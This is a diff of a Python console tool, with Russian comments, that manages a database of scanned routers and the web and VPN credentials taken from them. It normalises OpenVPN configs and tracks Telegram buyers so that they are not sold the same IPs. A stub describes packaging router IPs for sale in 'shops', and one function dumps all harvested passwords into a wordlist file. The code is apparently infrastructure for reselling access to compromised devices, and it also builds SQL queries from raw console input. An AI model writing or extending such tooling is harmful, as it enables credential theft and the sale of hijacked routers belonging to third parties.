+        #    print(tmp_path+'/'+row[2]+'.ovpn written')
+        with open(tmp_path+'/'+row[2]+'.ovpn','r') as f:
+            configData = ''
+            cfgData = tools.normalizeOVPNConfig(f, row[3])
+            for l in cfgData:
+                if (l[0:5] == 'dev t'):
+                    tuntap = l.strip().split(' ')[1]
+                if (l[0:6] == 'proto '):
+                    proto = l.strip().split(' ')[1][0:3]
+                if (l[0:21] == 'setenv opt tls-cipher'):
+                    tls0 = True
+                configData += l
+            if (tuntap == 'tun'): 
+                platform += 'M'
+                if (not tls0):
+                    platform += 'A'
+        with open(tmp_path+'/'+row[2]+'.ovpn','w') as f:
+            f.writelines(cfgData)
+        print(row[2], ':', tuntap, proto, platform)
+        updateVPNROUTERSargs = (configData,proto,tuntap,platform,row[1])
+    #    print(updateVPNROUTERSQuery % updateVPNROUTERSargs)
+        cursor.execute(updateVPNROUTERSQuery, updateVPNROUTERSargs)
+        #    print(tmp_path+'/'+row[2]+'.ovpn written')
+        pbar.update(1)
+    for fileName in os.listdir("./"+tmp_path):
+        os.remove("./"+tmp_path+'/'+fileName)
+    os.rmdir("./"+tmp_path)
+    cursor.close()
+    dbRS.close()
+    pbar.close()
+    return
+
+def checkIPchangedByDDNS():     # проверка не сменился ли IP по DDNS
+    print('Connecting to online DataBase.... Please Wait....')
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+    selectVPNROUTERSQuery = "SELECT IPADDR, DDNSURL, ROWID FROM VPNROUTERS WHERE DDNSURL != '' AND ISVPNDEAD = 0"
+    print('Executing query: ' + selectVPNROUTERSQuery)
+    cursor.execute(selectVPNROUTERSQuery)
+    result = cursor.fetchall()
+    resultsList = [[],[]]
+    for res in result:
+        if (res[1].find('@') != -1): 
+            continue
+        ddns = res[1]
+        ip = res[0]
+        ddns = ddns.replace('https://','')
+        ddns = ddns.replace('http://','')
+        if (ddns.find(':') != -1):
+            ddns = ddns.split(':')[0]
+        ddns = ddns.strip('/').strip()
+        print(ip, ddns)
+        try:
+            ipAddr = socket.gethostbyname(ddns)
+        except Exception as e:
+            print(e)
+            print('DDNS ', ddns, 'for IP ', ip, 'was not resolved totally - ERROR!!!')
+            resultsList[0].append((ip,ddns))
+            continue
+        if (ip == ipAddr):
+        #    print('IP ', ip, 'still attached to DDNS', ddns)
+            continue
+        else:
+            print('DDNS ', ddns, 'now attached to new IP', ipAddr, 'old IP been', ip)
+            resultsList[1].append((ip,ddns,ipAddr))
+    with open('checkResults.csv', 'w', encoding="ISO-8859-1") as f:
+        f.write('"Old IP";"DDNS";"New IP"\n')
+        for l in resultsList[1]:
+            f.write(l[0]+';'+l[1]+';'+l[2]+'\n')
+        f.write('"=====";"=====";"====="\n')
+        f.write('"Old IP";"DDNS"\n')
+        for l in resultsList[0]:
+            f.write(l[0]+';'+l[1]+'\n')
+    cursor.close()
+    dbRS.close()
+    print()
+    printALine()
+    print('Check finished!')
+    print('Check Data saved to file checkReults.csv')
+    return
+
+def linkClients():              # связать двух клиентов между собой
+    fc1LinkedList, fc2LinkedList = [], []
+    print('Connecting to online DataBase.... Please Wait....')
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+    print("here we'll create a link between two clients, not to let them buy same IPs")
+    fc1TgID = input('first client telegram ID:\n')
+    cursor.execute("SELECT * FROM `CUSTOMERS` WHERE `TelegramID` LIKE '" + fc1TgID + "'")
+    res = cursor.fetchone()
+    print(res)
+    if res == None:
+        print('Customer with Telegram ID ', fc1TgID, 'was not found in database.')
+        a = input('input "A" to add him to customers list or just hit Enter to exit:\n')
+        if a == 'A':
+            cursor.execute('INSERT INTO CUSTOMERS (TelegramID) VALUES (' + '"' + fc1TgID + '")')
+            dbRS.commit()
+            cursor.execute("SELECT * FROM `CUSTOMERS` WHERE `TelegramID` LIKE '" + fc1TgID + "'")
+            res = cursor.fetchone()
+            fc1ID = res[0]
+            fc1Linked = ''            
+        else:
+            printALine
+            cursor.close()
+            dbRS.close()    
+            return
+    else:
+        fc1ID = res[0]
+        fc1Linked = res[4]
+    fc2TgID = input('second client telegram ID:\n')
+    cursor.execute("SELECT * FROM `CUSTOMERS` WHERE `TelegramID` LIKE '" + fc2TgID + "'")
+    res = cursor.fetchone()
+    print(res)
+    if res == None:
+        print('Customer with Telegram ID ', fc2TgID, 'was not found in database.')
+        a = input('input "A" to add him to customers list or just hit Enter to exit:\n')
+        if a == 'A':
+            cursor.execute('INSERT INTO CUSTOMERS (TelegramID) VALUES (' + '"' + fc2TgID + '")')
+            dbRS.commit()
+            cursor.execute("SELECT * FROM `CUSTOMERS` WHERE `TelegramID` LIKE '" + fc2TgID + "'")
+            res = cursor.fetchone()
+            fc2ID = res[0]
+            fc2Linked = ''            
+        else:
+            printALine
+            cursor.close()
+            dbRS.close()    
+            return
+    else:
+        fc2ID = res[0]
+        fc2Linked = res[4]    
+    if fc1Linked != '':
+        fc1LinkedList = fc1Linked.split(' ')
+    if fc2Linked != '':
+        fc2LinkedList = fc2Linked.split(' ')
+
+    print(fc1ID, fc1LinkedList, " | ", fc2ID, fc2LinkedList)
+    if (str(fc2ID) not in fc1LinkedList):
+        fc1LinkedList.append(str(fc2ID))
+        if fc1Linked == '':
+            fc1Linked = str(fc2ID)
+        else: 
+            fc1Linked = fc1Linked + ' ' + str(fc2ID)
+    if (str(fc1ID) not in fc2LinkedList):
+        fc2LinkedList.append(str(fc1ID))
+        if fc2Linked == '':
+            fc2Linked = str(fc1ID)
+        else: 
+            fc2Linked = fc2Linked + ' ' + str(fc1ID)
+    print(fc1ID, fc1Linked, " | ", fc2ID, fc2Linked)
+    cursor.execute("UPDATE CUSTOMERS SET ConnIDs=%s WHERE ID = %s", (fc1Linked, fc1ID))
+    cursor.execute("UPDATE CUSTOMERS SET ConnIDs=%s WHERE ID = %s", (fc2Linked, fc2ID))
+    dbRS.commit()
+    cursor.close()
+    dbRS.close()
+    print('Success!!!')
+    printALine    
+    return
+
+def deleteDeadRouters():        # удалить мертвые роутеры из таблицы (переместить их в отдельную таблицу мертвых роутеров)
+    print('Connecting to online DataBase.... Please Wait....')
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+    selectQuery = "SELECT * FROM VPNROUTERS WHERE ISVPNDEAD = 1 AND ISWEBLOGINDEAD = 1"
+    cursor.execute(selectQuery)
+    res = cursor.fetchall()
+    if ((res == None) or (len(res) == 0)):
+        cursor.close()
+        dbRS.close()
+        printALine()
+        return
+    for r in res:
+        insertQuery = "INSERT INTO VPNRSDEL SELECT VPNROUTERS.* FROM VPNROUTERS WHERE VPNROUTERS.ROWID = " + str(r[28])
+        delQuery = "DELETE FROM VPNROUTERS WHERE ROWID = " + str(r[28])
+        print(insertQuery)
+        cursor.execute(insertQuery)
+        print(delQuery)
+        cursor.execute(delQuery)
+        dbRS.commit()
+    cursor.close()
+    dbRS.close()
+    printALine()
+    return
+
+def listAllPasswordsinDB():
+
+    print('Connecting to online DataBase.... Please Wait....')
+
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+
+    passList = []
+
+    if input('Should we get passwords from routers webfaces? ("Y/N"): ') == 'Y':
+        cursor.execute('SELECT LOGPASS FROM SCANRESS GROUP BY LOGPASS')
+        res = cursor.fetchall()
+        for l in res:
+            if (l[0].find(':') == -1):
+                passList.append(l[0])
+            else:
+                passList.append(l[0].split(':')[1])
+        cursor.execute('SELECT LOGPASS FROM VPNROUTERS GROUP BY LOGPASS')
+        res = cursor.fetchall()
+        for l in res:
+            if (l[0].find(':') == -1):
+                passList.append(l[0])
+            else:
+                passList.append(l[0].split(':')[1])
+    if input('Should we get passwords from VPNs? ("Y/N"): ') == 'Y':
+        cursor.execute('SELECT VPNLOGPASS FROM SCANRESS GROUP BY VPNLOGPASS')
+        res = cursor.fetchall()
+        for l in res:
+            if (l[0].find(':') == -1):
+                passList.append(l[0])
+            else:
+                passList.append(l[0].split(':')[1])
+        cursor.execute('SELECT VPNLOGPASS FROM VPNROUTERS GROUP BY VPNLOGPASS')
+        res = cursor.fetchall()
+        for l in res:
+            if (l[0].find(':') == -1):
+                passList.append(l[0])
+            else:
+                passList.append(l[0].split(':')[1])
+    passList = sorted(list(set(passList)))
+    print(passList)
+    print('Outputting results to passList.txt...')
+    badPass = ['','<>','[hash]','<empty>']
+    with open('passList.txt', 'w') as f:
+        for l in passList:
+            if (l.strip() not in badPass):
+                f.write(l + '\n')
+
+    print('')
+    print('Success!!!')
+    printALine    
+
+    cursor.close()
+    dbRS.close()
+    return
+
+def prepareIPsForShopsFromList():     # подготовка роутеров для продажи в шопах
+                                    # список IP для продажи берется из файла либо вводится в консоль списком где разделитель это перенос строки
+                                    # затем во временном каталоге tmp формируются архивы для каждого из шопов
+                                    # производится проверка на то что данный IP уже продавался в данном шопе
+                                    # затем сформированные архивы заливаются на фтп в соотвтествии с настройками шопов
+                                    # результат список ссылок на архивы для каждого шопа
+    
     return
 
 def subSubMenu1execution():
@@ -1045,6 +1630,10 @@ def subMenu3execution():
         elif sm3res == '3':
             uploadOpenVPNconfigs()
         elif sm3res == '4':
+            submitVpnRoutersSideSource()
+        elif sm3res == '5':
+            markDeadVPNs()
+        elif sm3res == '6':
             print('Here will be some more functions later...')
     return 
 
@@ -1058,8 +1647,25 @@ def subMenu4execution():
         elif sm4res == '2':
             submitSellsFromFile()
         elif sm4res == '3':
-            print('Here will be some more functions later...')
+            createDateOrderedList4Sells()
         elif sm4res == '4':
+            linkClients()
+        elif sm4res == '5':
+            print('Here will be some more functions later...')
+    return 
+
+def subMenu5execution():
+    while True:
+        sm5res = subMenu5()
+        if sm5res == '0':
+            break
+        elif sm5res == '1':
+            prepareIPsForShopsFromList()
+        elif sm5res == '2':
+            print('Here will be some more functions later...')
+        elif sm5res == '3':
+            print('Here will be some more functions later...')
+        elif sm5res == '4':
             print('Here will be some more functions later...')
     return 
 
@@ -1071,10 +1677,20 @@ def subMenu9execution():
         elif sm9res == '1':
             toolsMenuCheckScores()
         elif sm9res == '2':
-            checkOpenvpnConfigs()
+            checkAndNormaliseOVPNconfigsInDatabase()
         elif sm9res == '3':
-            print('Here will be some more functions later...')
+            downloadOpenvpnConfigs()
         elif sm9res == '4':
+            toolsMenuCheckIPQualityScoresAll()
+        elif sm9res == '5':
+            checkIPsAlreadyInDatabase()
+        elif sm9res == '6':
+            checkIPchangedByDDNS()        
+        elif sm9res == '7':
+            deleteDeadRouters()
+        elif sm9res == '8':
+            listAllPasswordsinDB()
+        elif sm9res == '9':
             print('Here will be some more functions later...')
     return 
 
@@ -1090,6 +1706,8 @@ while True:
         subMenu3execution()
     elif mmres == '4':
         subMenu4execution()
+    elif mmres == '5':
+        subMenu5execution()
     elif mmres == '9':
         subMenu9execution()
     else:
